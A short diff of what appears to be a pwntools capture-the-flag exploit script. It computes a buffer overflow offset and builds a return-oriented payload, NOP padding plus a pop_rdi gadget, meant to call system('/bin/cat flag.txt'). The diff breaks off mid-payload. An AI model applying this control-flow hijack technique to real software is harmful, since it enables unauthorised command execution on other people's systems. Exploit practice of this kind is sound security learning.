@@ -69,7 +69,8 @@ pattern = core.read(stack, 4)
 offset = cyclic_find(pattern)
 info("%r pattern (offset: %r)", pattern, offset)
 
-# Craft a new payload which puts the "target" address at the correct offset
+# Craft a new payload which puts system('/bin/cat flag.txt') at correct offset
+# Note that we have to call pop_rdi gadget here
 payload = flat(
     asm('nop') * offset,
     pop_rdi_gadget,
